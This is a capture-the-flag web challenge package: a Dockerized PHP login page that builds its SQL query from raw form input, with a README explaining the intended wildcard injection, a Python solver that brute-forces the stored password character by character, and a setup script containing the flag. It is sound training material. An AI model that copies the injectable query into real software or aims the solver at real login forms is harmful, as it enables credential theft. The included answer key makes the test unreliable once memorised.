{
    "Dockerfile": "FROM ubuntu:latest\n\nenv DEBIAN_FRONTEND=\"noninteractive\"\n\nRUN apt-get update -y && apt-get -y install apache2 mysql-server php libapache2-mod-php php-mysql\n\n\nCOPY start.sh /start.sh\nCOPY index.html /var/www/html/index.html\nCOPY login.php /var/www/html/login.php\n\nenv APACHE_RUN_USER    www-data\nenv APACHE_RUN_GROUP   www-data\nenv APACHE_PID_FILE    /var/run/apache2.pid\nenv APACHE_RUN_DIR     /var/run/apache2\nenv APACHE_LOCK_DIR    /var/lock/apache2\nenv APACHE_LOG_DIR     /var/log/apache2\n\nEXPOSE 80\nENTRYPOINT [\"bash\",\"/start.sh\"]",
    "index.html": "<html>\n\n<head>\n    <link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\" integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\" crossorigin=\"anonymous\">\n</head>\n\n<body class=\"row\" style=\"min-height: 100vh\">\n    <div class=\"card mx-auto my-auto\" style=\"width: 33vw\">\n        <div class=\"card-body\">\n            <form action=\"/login.php\" method=\"post\">\n                <div class=\"form-group\">\n                    <input type=\"text my-auto\" class=\"form-control\" name=\"username\" placeholder=\"Username\">\n                </div>\n                <div class=\"form-group\">\n                    <input type=\"password\" class=\"form-control\" name=\"password\" placeholder=\"Password\">\n                </div>\n                <div class=\"form-group\" style=\"text-align: right\">\n                    <button type=\"submit\" class=\"btn btn-primary\">Submit</button>\n                </div>\n            </form>\n        </div>\n    </div>\n</body>\n</html>\n\n",
    "login.php": "<?php\n$address = \"localhost\";\n$user = \"webserver\";\n$password = \"wBUs?kWKvXDV?V%xQwj^=xqZGL*29wGP\";\n$db = \"db\";\n\nif( isset($_POST['username']) && isset($_POST['password'])) {\n    \n    $connection = new mysqli($address, $user, $password, $db);\n    if ($connection->connect_error) {\n        die(\"Connection failed: \" . $connection->connect_error);\n    }\n\n    $login_user = $_POST['username'];\n    $login_pass = $_POST['password'];\n\n    $sql = \"SELECT * FROM accounts WHERE username='$login_user' AND password='$login_pass'\";\n    $result = $connection->query($sql);\n\n    if($result->num_rows == 1) {\n        echo \"You've successfully authorized, but that doesn't get you the password.  \";\n    } else {\n        echo \"Invalid login info.  \";\n    }\n    $connection->close();\n} else {\n    echo \"Both username and password must be entered.  \";\n}\n?>",
    "README.md": "## Description\n\nThe owner of this website often reuses passwords.  Can you find out the password they are using on this test server?  \n\n## Documentation\n\nAn SQL injection challenge in which the flag is the password.  It can be extracted by using wildcards when injecting.  I decided I might as well tell them the goal because this was supposed to be an easy challenge.  \n\n### Setup\n\n1. docker build . -t passwordextraction\n2. docker run -p 80:80 passwordextraction\n\n## Solution\n\nYou could in theory do the entire thing manually with sql wildcards like so \"'or password like 'g%'\".  I imagine everyone will write a short script to just brute force it because the script to do so is pretty straightforward.  I've included a solver in solution.py.  ",
    "solution.py": "import string\nimport requests\n\nurl = \"http://localhost/login.php\"\ninjection = \"' OR password LIKE '{}%\"\nflag = \"\"\nvalid_chars = [x for x in string.printable if x not in [\"%\", \"_\"]]\ndef checkChar(val):\n    payload = {\"username\": \"admin\", \"password\": injection.format(flag + val)}\n    r = requests.post(url, data=payload)\n    return r.text[0] == \"Y\"\n\n\nwhile True:\n    for i in valid_chars:\n        valid = checkChar(i)\n        if(valid):\n            flag += i\n            break\n    print(flag)\n\n\n",
    "start.sh": "chown -R mysql:mysql /var/lib/mysql /var/run/mysqld\n\nservice mysql start\n\nmysql -u root -e \"CREATE DATABASE db; GRANT ALL PRIVILEGES ON *.* TO 'webserver'@'localhost' IDENTIFIED BY 'wBUs?kWKvXDV?V%xQwj^=xqZGL*29wGP';\"\nmysql -u root -e \"USE db; CREATE TABLE accounts (username varchar(32), password varchar(32) collate utf8_bin);\"\nmysql -u root -e \"USE db; INSERT INTO accounts (username,password) VALUES ('admin', 'gigem{h0peYouScr1ptedTh1s}');\"\n\napache2 -D FOREGROUND\n",
    "category": "Web"
}